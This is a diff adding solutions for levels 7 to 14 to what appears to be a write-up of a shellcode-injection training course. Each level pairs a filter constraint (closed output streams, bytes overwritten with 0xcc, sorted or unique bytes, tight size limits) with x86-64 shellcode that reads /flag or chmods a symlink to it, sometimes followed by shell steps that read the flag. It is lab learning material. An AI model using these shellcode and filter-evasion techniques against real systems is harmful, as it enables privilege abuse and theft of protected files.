@@ -266,3 +266,250 @@ sys_2:
 .byte 0x0e
 .byte 0x04
 ```
+
+## 7
+```s
+.intel_syntax noprefix
+.global _start
+.section .text
+_start:
+
+push [rip+flag]
+mov rdi,rsp
+xor rsi,rsi
+call open
+
+mov rdi,rax # /flag fd
+
+sub rsp, 64
+mov rbp, rsp
+
+mov rsi,rbp
+mov rdx,64
+call read
+
+push [rip+myflag]
+mov rdi,rsp
+mov rsi,1
+call open
+
+mov rdi,rax
+mov rsi,rbp
+mov rdx,64
+call write
+
+jmp exit
+
+open:
+# open(path, NULL);
+push rbp
+mov rbp, rsp
+mov rax, 2
+syscall
+pop rbp
+ret
+
+read:
+# read(fd, buf, count)
+push rbp
+mov rbp, rsp
+mov rax, 0
+syscall
+pop rbp
+ret
+
+write:
+push rbp
+mov rbp, rsp
+mov rax, 1
+syscall
+pop rbp
+ret
+
+exit:
+mov rax, 60
+xor rdi, rdi
+syscall
+
+myflag:
+	.string "myflag"
+
+flag:
+	.string "/flag"
+```
+Task:
+This challenge is about to close stdin, which means that it will be harder to pass in a stage-2 shellcode. You will need
+to figure an alternate solution (such as unpacking shellcode in memory) to get past complex filters.
+
+This challenge is about to close stderr, which means that you will not be able to get use file descriptor 2 for output.
+
+This challenge is about to close stdout, which means that you will not be able to get use file descriptor 1 for output.
+You will see no further output, and will need to figure out an alternate way of communicating data back to yourself.
+
+## 8
+Task: Reading 0x12 bytes from stdin. 
+
+```s
+.intel_syntax noprefix
+.global _start
+.section .text
+_start:
+
+push 0x41
+push rsp
+pop rdi
+mov esi,444
+mov rax,90
+syscall
+
+```
+```sh
+ls -s /flag A
+```
+
+## 9
+Task:
+This challenge modified your shellcode by overwriting every other 10 bytes with 0xcc. 0xcc, when interpreted as an
+instruction is an `INT 3`, which is an interrupt to call into the debugger. You must avoid these modifications in your
+shellcode.
+
+```s
+.intel_syntax noprefix
+.global _start
+.section .text
+_start:
+
+push 0x41
+push rsp
+pop rdi
+jmp JUMP
+
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+nop
+
+JUMP:
+mov al,0x5a
+mov esi,0x1f
+syscall
+```
+
+## 10
+Task:
+This challenge just sorted your shellcode using bubblesort. Keep in mind the impact of memory endianness on this sort
+(e.g., the LSB being the right-most byte).
+
+This sort processed your shellcode 8 bytes at a time.
+
+```s
+.intel_syntax noprefix
+.global _start
+.section .text
+_start:
+
+push 0x41
+push rsp
+pop rdi
+mov al,0x5a
+mov esi,0x1f
+syscall
+```
+## 11
+Task:
+This challenge is about to close stdin, which means that it will be harder to pass in a stage-2 shellcode. You will need
+to figure an alternate solution (such as unpacking shellcode in memory) to get past complex filters.
+
+```s
+.intel_syntax noprefix
+.global _start
+.section .text
+_start:
+
+push 0x41
+push rsp
+pop rdi
+mov al,0x5a
+mov esi,0x1f
+syscall
+```
+## 12
+Task: This challenge requires that every byte in your shellcode is unique!
+
+```s
+.intel_syntax noprefix
+.global _start
+.section .text
+_start:
+
+push 0x41
+push rsp
+pop rdi
+mov al,0x5a
+mov sil,0x4
+syscall
+```
+
+## 13
+Task: Reading 0xc bytes from stdin.
+```s
+.intel_syntax noprefix
+.global _start
+.section .text
+_start:
+
+push 0x41
+push rsp
+pop rdi
+mov al,0x5a
+mov sil,0x4
+syscall
+```
+## 14
+Task: Reading 0x6 bytes from stdin.
+```s
+.intel_syntax noprefix
+.global _start
+.section .text
+_start:
+
+push rax
+pop rdi
+push rdx
+pop rsi
+syscall
+
+nop
+nop
+nop
+nop
+nop
+
+nop
+nop
+nop
+nop
+nop
+
+push 0x42
+push rsp
+pop rdi
+mov al,0x5a
+mov sil,0x4
+syscall
+```
+```sh
+ln -sf /flag A
+cat A
+```
